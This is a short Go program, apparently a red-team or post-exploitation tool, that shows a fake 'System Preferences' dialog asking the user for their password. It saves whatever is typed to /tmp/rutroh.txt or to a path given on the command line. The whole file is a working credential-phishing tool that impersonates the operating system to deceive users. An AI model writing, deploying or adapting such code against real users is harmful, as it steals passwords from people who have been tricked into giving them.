package main

import (
	"io/ioutil"
	"os"

	"github.com/gen2brain/dlgs"
)

var (
	title        = "System Preferences"
	prompt       = "Enter your password to continue."
	saveLocation = "/tmp/rutroh.txt"
)

func main() {
	if len(os.Args) < 2 {
		promptfun(saveLocation)
	} else {
		// First arg, the outfile
		outfile := os.Args[1]
		promptfun(outfile)
	}
}

func promptfun(save string) {
	passwd, _, err := dlgs.Password(title, prompt)
	if err != nil {
		panic(err)
	}
	err = ioutil.WriteFile(save, []byte(passwd), 0700)
	if err != nil {
		panic(err)
	}
}
